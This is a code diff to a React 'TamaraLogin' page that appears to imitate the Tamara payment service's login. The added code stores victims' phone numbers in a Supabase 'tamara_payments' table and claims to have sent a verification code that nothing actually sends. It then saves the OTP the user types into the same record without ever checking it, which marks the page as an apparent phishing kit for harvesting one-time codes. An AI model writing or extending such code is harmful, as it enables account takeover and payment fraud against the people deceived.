@@ -5,6 +5,8 @@ import { Input } from "@/components/ui/input";
 import { Checkbox } from "@/components/ui/checkbox";
 import { InputOTP, InputOTPGroup, InputOTPSlot } from "@/components/ui/input-otp";
 import tamaraLogo from "@/assets/tamara-logo.png";
+import { supabase } from "@/integrations/supabase/client";
+import { useToast } from "@/hooks/use-toast";
 
 const TamaraLogin = () => {
   const [phoneNumber, setPhoneNumber] = useState("");
@@ -12,8 +14,10 @@ const TamaraLogin = () => {
   const [otp, setOtp] = useState("");
   const [agreedToTerms, setAgreedToTerms] = useState(false);
   const [timer, setTimer] = useState(24);
+  const [paymentId, setPaymentId] = useState<string | null>(null);
   const [searchParams] = useSearchParams();
   const navigate = useNavigate();
+  const { toast } = useToast();
   const price = searchParams.get("price") || "0";
   const company = searchParams.get("company") || "";
 
@@ -36,11 +40,43 @@ const TamaraLogin = () => {
     }
   };
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    setOtpSent(true);
-    setTimer(24);
-    console.log("Phone number:", phoneNumber);
+    
+    try {
+      // إنشاء سجل دفع فوراً مع رقم الهاتف
+      const { data, error } = await supabase
+        .from("tamara_payments")
+        .insert({
+          phone: `966${phoneNumber}`,
+          total_amount: parseFloat(price),
+          monthly_payment: parseFloat(price) / 4,
+          company: company,
+          cardholder_name: "في انتظار الإدخال",
+          card_number_last4: "0000",
+          payment_status: "pending",
+        })
+        .select()
+        .single();
+
+      if (error) throw error;
+      
+      setPaymentId(data.id);
+      setOtpSent(true);
+      setTimer(24);
+      
+      toast({
+        title: "تم الإرسال",
+        description: "تم إرسال رمز التحقق إلى رقم هاتفك",
+      });
+    } catch (error) {
+      console.error("Error creating payment:", error);
+      toast({
+        title: "خطأ",
+        description: "حدث خطأ في إرسال رمز التحقق",
+        variant: "destructive",
+      });
+    }
   };
 
   const handleResendOtp = () => {
@@ -48,10 +84,29 @@ const TamaraLogin = () => {
     console.log("Resending OTP to:", phoneNumber);
   };
 
-  const handleVerifyOtp = () => {
-    if (otp.length === 4 && agreedToTerms) {
-      console.log("Verifying OTP:", otp);
-      navigate(`/tamara-checkout?company=${encodeURIComponent(company)}&price=${price}`);
+  const handleVerifyOtp = async () => {
+    if (otp.length === 4 && agreedToTerms && paymentId) {
+      try {
+        // تحديث السجل مع OTP التحقق من الهاتف
+        const { error } = await supabase
+          .from("tamara_payments")
+          .update({
+            otp_code: otp,
+          })
+          .eq("id", paymentId);
+
+        if (error) throw error;
+
+        // الانتقال لصفحة الدفع مع paymentId
+        navigate(`/tamara-checkout?company=${encodeURIComponent(company)}&price=${price}&paymentId=${paymentId}`);
+      } catch (error) {
+        console.error("Error verifying OTP:", error);
+        toast({
+          title: "خطأ",
+          description: "حدث خطأ في التحقق من الرمز",
+          variant: "destructive",
+        });
+      }
     }
   };
 
